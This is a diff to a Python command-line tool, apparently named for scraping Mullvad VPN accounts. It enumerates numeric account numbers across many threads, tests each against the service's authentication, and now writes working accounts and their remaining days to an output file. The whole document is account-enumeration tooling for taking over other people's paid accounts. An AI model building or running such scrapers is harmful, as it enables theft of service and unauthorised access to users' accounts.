@@ -22,8 +22,9 @@ def cli():
 @click.option('-a', '--accounts', required=True, type=click.INT, help='Number of accounts.')
 @click.option('-s', '--start', default=0, type=click.INT, help='Number to start from.')
 @click.option('-r', '--random', type=click.IntRange(1, 15), help='Randomize number to check.')
+@click.argument('output', type=click.File('a'))
 @cli.command(context_settings=CONTEXT_SETTINGS)
-def scrape(accounts, threads, start, random):
+def scrape(accounts, threads, start, random, output):
 	"""Scrape Mullvad accounts."""
 	starttime = time.time()
 	for x in range(accounts):
@@ -33,12 +34,13 @@ def scrape(accounts, threads, start, random):
 			queue.put(start+x)
 
 	for i in range(threads):
-		worker = threading.Thread(target=Worker, args=(queue,))
+		worker = threading.Thread(target=Worker, args=(queue, accounts, output))
 		worker.setDaemon(True)
 		worker.start()
 
 	queue.join()
-	click.secho('Finished in %ss' % round((time.time()-starttime), 2), fg='yellow')
+	click.clear()
+	click.secho('\nFinished in %ss' % round((time.time()-starttime), 2), fg='yellow')
 
 @cli.command(context_settings=CONTEXT_SETTINGS)
 @click.argument('input', type=click.File('r'))
@@ -60,7 +62,7 @@ def check(input, threads):
 	queue.join()
 	click.secho('Finished in %ss' % round((time.time()-starttime), 2), fg='yellow')
 
-def DoWork(account):
+def DoWork(account, output):
 	try:
 		authresponse = auth(account)
 	except requests.Timeout:
@@ -69,13 +71,18 @@ def DoWork(account):
 	 		os._exit(666)
 	if authresponse:
 		with print_lock:
-			click.secho('Account %s has %s days left.' % (account, authresponse.split()[5]), fg='green')
+			click.echo('Account %s has %s days left.' % (account, authresponse.split()[5]), file=output)
+			output.flush()
 
-def Worker(q):
+def Worker(q, a, o):
 	while True:
 		account = q.get()
-		DoWork(account)
+		DoWork(account, o)
 		q.task_done()
+		with click.progressbar(length=a, label='Checking the accounts') as bar:
+			with print_lock:
+				click.clear()
+ 				bar.update(a-queue.qsize())
 
 def random_with_N_digits(n):
 	range_start = 10**(n-1)
